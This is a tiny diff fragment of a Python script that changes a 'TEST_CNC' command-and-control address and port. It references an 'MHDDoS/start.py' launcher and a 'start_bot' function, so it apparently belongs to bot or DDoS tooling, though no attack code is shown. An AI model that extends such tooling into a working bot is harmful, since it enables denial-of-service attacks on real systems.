@@ -9,7 +9,7 @@ import os
 CUR_DIR = os.path.dirname(os.path.realpath(__file__))
 MHDDoS = os.sep + 'MHDDoS' + os.sep + 'start.py'
 #  MHDDoS = '/home/frankwu/code/' + 'MHDDoS' + os.sep + 'start.py'
-TEST_CNC = "192.168.100.4"
+TEST_CNC = "192.168.100.5"
 TEST_CNC_PORT = 9999
 
 async def start_bot():
